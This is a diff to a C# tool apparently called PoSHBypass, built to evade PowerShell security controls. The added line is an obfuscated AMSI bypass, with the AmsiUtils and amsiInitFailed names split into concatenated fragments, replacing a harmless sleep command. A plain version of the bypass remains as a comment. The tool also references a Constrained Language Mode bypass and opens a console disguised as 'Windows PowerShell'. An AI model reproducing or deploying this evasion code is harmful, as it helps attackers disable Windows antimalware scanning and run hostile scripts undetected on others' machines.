@@ -59,7 +59,7 @@ namespace PoSHBypass
             {
                 //string Command = @"[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('No PS Logging Enabled and Constrained Language Mode Bypassed!!');";
                 //string Command = @"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
-                string Command = @"Start-Sleep 0.1";
+                string Command = @"[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)";
 
                 using (PowerShell powerShellInstance = PowerShell.Create())
                 {
@@ -77,9 +77,6 @@ namespace PoSHBypass
                     powerShellInstance.AddScript(Command);
                     powerShellInstance.Invoke();
                 }
-                //var fi = typeof(SystemPolicy).GetField("systemLockdownPolicy", BindingFlags.NonPublic | BindingFlags.Static);
-                //fi.SetValue(null, SystemEnforcementMode.None);
-
 
                 AllocConsole();
                 SetConsoleTitle("Windows PowerShell");
